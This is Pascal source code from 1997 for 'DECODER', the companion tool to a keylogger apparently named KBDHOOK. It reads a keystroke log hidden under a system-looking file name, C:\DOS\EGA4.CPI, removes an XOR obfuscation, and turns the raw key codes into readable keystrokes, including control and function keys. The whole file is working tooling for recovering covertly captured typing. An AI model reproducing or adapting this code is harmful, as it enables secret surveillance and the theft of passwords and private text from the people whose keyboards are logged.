{***********************************}
{ DECODER for KBDHOOK, version 1.0. }
{ Copyright (C) 1997 by CodeMaster. }
{ Fidonet: 2:5002/39.               }
{ E-mail: cm@liceum.secna.ru.       }
{***********************************}

program Decoder;

const
  InFileName = 'C:\DOS\EGA4.CPI';
  OutFileName = 'DECODED';
  XorCode = $4B48;

var
  F: file of Word;
  T: Text;
  W: Word;

  procedure Fatal(const Msg: String);
  begin
    WriteLn(Msg);
    Halt
  end;

  function Num2Str(B: Byte): String;
  var
    S: String;
  begin
    Str(B, S);
    Num2Str := S
  end;

  function KeyName(Key: Word): String;
  const
    QWERTY: String[10] = 'QWERTYUIOP';
    ASDF: String[9] = 'ASDFGHJKL';
    ZXCV: String[7] = 'ZXCVBNM';
  var
    St: String;
  begin
    St := '';
    case Lo(Key) of
      13: St := #13;
      0..31: St := 'Ctrl+'+Char(Key+64);
      32..255: St := Char(Key)
    end;
    case Key of
      $011B: St := 'Esc';
      $0200: St := 'Alt+Space';
      $0400: St := 'Ctrl+Ins';
      $0500: St := 'Shift+Ins';
      $0600: St := 'Ctrl+Del';
      $0700: St := 'Shift+Del';
      $0E08: St := 'Backspace';
      $0E7F: St := 'Ctrl+Backspace';
      $0F00: St := 'Shift+Tab';
      $0F09: St := 'Tab';
      $1C0A: St := 'Ctrl+Enter';
      $1C0D: St := #13;
      $4700: St := 'Home';
      $4800: St := 'Up';
      $4900: St := 'PgUp';
      $4A2D: St := 'GrayMinus';
      $4B00: St := 'Left';
      $4D00: St := 'Right';
      $4E2B: St := 'GrayPlus';
      $4F00: St := 'End';
      $5000: St := 'Down';
      $5100: St := 'PgDn';
      $5200: St := 'Ins';
      $5300: St := 'Del';
      $7200: St := 'Ctrl+PrtSc';
      $7300: St := 'Ctrl+Left';
      $7400: St := 'Ctrl+Right';
      $7500: St := 'Ctrl+End';
      $7600: St := 'Ctrl+PgDn';
      $7700: St := 'Ctrl+Home';
      $8200: St := 'Alt+Minus';
      $8300: St := 'Alt+Equal';
      $8400: St := 'Ctrl+PgUp';
      {*** Extended key codes ***}
      $8500: St := 'F11';
      $8600: St := 'F12';
      $8700: St := 'Shift+F11';
      $8800: St := 'Shift+F12';
      $8900: St := 'Ctrl+F11';
      $8A00: St := 'Ctrl+F12';
      $8B00: St := 'Alt+F11';
      $8C00: St := 'Alt+F12';
      $4C00: St := 'Pad5';
      $8D00: St := 'Ctrl+Up';
      $9100: St := 'Ctrl+Down';
      $9200: St := 'Ctrl+Ins';
      $9300: St := 'Ctrl+Del';
      $8F00: St := 'Ctrl+Pad5';
      $9800: St := 'Alt+Up';
      $A000: St := 'Alt+Down';
      $9B00: St := 'Alt+Left';
      $9D00: St := 'Alt+Right';
      $9700: St := 'Alt+Home';
      $9F00: St := 'Alt+End';
      $9900: St := 'Alt+PgUp';
      $A100: St := 'Alt+PgDn';
      $A200: St := 'Alt+Ins';
      $A300: St := 'Alt+Del';
      $9C00: St := 'Alt+Pad5';
      $9400: St := 'Ctrl+Tab';
      $8E00: St := 'Ctrl+GrayMinus';
      $9000: St := 'Ctrl+GrayPlus';
      $0E00: St := 'Alt+Backspace';
      $A500: St := 'Alt+Tab';
      $1C00: St := 'Alt+Enter';
      $0100: St := 'Alt+Esc';
      $8200: St := 'Alt+Minus';
      $8300: St := 'Alt+Plus';
      $4A00: St := 'Alt+GrayMinus';
      $4E00: St := 'Alt+GrayPlus';
      $3700: St := 'Alt+GrayStar';
      $3300: St := 'Alt+,';
      $3400: St := 'Alt+.';
      $3500: St := 'Alt+/';
      $2700: St := 'Alt+;';
      $2800: St := 'Alt+''';
      $2900: St := 'Alt+`';
      $1A00: St := 'Alt+[';
      $1B00: St := 'Alt+]';
      $2B00: St := 'Alt+\'
    else
      if Lo(Key) = 0 then
      begin
        Key := Hi(Key);
        case Key of
          $10..$19: St := 'Alt+'+QWERTY[Key-$0F];
          $1E..$26: St := 'Alt+'+ASDF[Key-$1D];
          $2C..$32: St := 'Alt+'+ZXCV[Key-$2B];
          $3B..$44: St := 'F'+Num2Str(Key-$3A);
          $54..$5D: St := 'Shift+F'+Num2Str(Key-$53);
          $5E..$67: St := 'Ctrl+F'+Num2Str(Key-$5D);
          $68..$71: St := 'Alt+F'+Num2Str(Key-$67);
          $78..$81: St := 'Alt+'+Num2Str(Key-$77)
        end
      end
    end;
    if Length(St) <> 1 then St := '<'+St+'>';
    KeyName := St
  end;

begin
  WriteLn('DECODER, version 1.0.');
  WriteLn('Copyright (C) 1997 by Eugene Nonko aka CodeMaster 2:5002/39@Fidonet.');
  WriteLn;
  Assign(F, InFileName);
  Reset(F);
  if IOResult <> 0 then Fatal('File not found "'+InFileName+'".');
  Assign(T, OutFileName);
  Rewrite(T);
  while not EOF(F) do
  begin
    Read(F, W);
    Write(T, KeyName(W xor XorCode))
  end;
  Close(T);
  Close(F);
  WriteLn('OK.')
end.
